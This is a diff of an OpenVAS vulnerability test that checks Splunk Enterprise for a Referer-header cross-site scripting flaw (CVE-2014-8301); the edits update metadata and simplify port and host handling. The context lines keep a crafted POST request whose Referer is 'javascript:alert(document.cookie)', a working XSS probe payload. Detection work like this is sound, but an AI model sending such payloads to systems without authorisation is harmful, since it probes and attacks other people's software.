@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_splunk_referer_header_xss_vuln02_feb15.nasl 6404 2017-06-22 10:00:06Z teissa $
+# $Id: gb_splunk_referer_header_xss_vuln02_feb15.nasl 6709 2017-07-12 15:16:14Z cfischer $
 #
 # Splunk Enterprise 'Referer' Header Cross-Site Scripting Vulnerability -02 Feb15
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:splunk:splunk";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805333");
-  script_version("$Revision: 6404 $");
+  script_version("$Revision: 6709 $");
   script_cve_id("CVE-2014-8301");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2017-06-22 12:00:06 +0200 (Thu, 22 Jun 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-07-12 17:16:14 +0200 (Wed, 12 Jul 2017) $");
   script_tag(name:"creation_date", value:"2015-02-05 12:04:16 +0530 (Thu, 05 Feb 2015)");
   script_name("Splunk Enterprise 'Referer' Header Cross-Site Scripting Vulnerability -02 Feb15");
 
@@ -73,8 +73,6 @@ if(description)
   exit(0);
 }
 
-##Code starts from here##
-
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
@@ -86,20 +84,8 @@ rcvRes = "";
 ses_id = "";
 dir = "";
 
-## Get HTTP Port
-http_port = get_http_port(default:8000);
-if(!http_port){
-  http_port = 8000;
-}
-
-## Check the port status
-if(!get_port_state(http_port)){
-  exit(0);
-}
-
-if(!dir = get_app_location(cpe:CPE, port:http_port)){
-  exit(0);
-}
+if(!http_port = get_app_port(cpe:CPE)) exit(0);
+if(!dir = get_app_location(cpe:CPE, port:http_port)) exit(0);
 
 sndReq = http_get(item:string(dir, "/account/login"), port:http_port);
 rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
@@ -111,9 +97,7 @@ if(!ses_id[1]){
    exit(0);
 }
 
-host = get_host_name();
-if( http_port != 80 && http_port != 443 )
-   host += ':' + http_port;
+host = http_host_name(port:http_port);
 
 url = dir + "/i18ncatalog?autoload=1";
 
@@ -124,7 +108,6 @@ sndReq = string("POST ", url, " HTTP/1.1\r\n",
                 "Referer:javascript:alert(document.cookie)","\r\n",
                 "Cookie:ses_id_", http_port, "=", ses_id[1],"\r\n",
                 "Content-Length: 0","\r\n\r\n");
-
 rcvRes = http_send_recv(port:http_port, data:sndReq);
 
 #Confirm Exploit
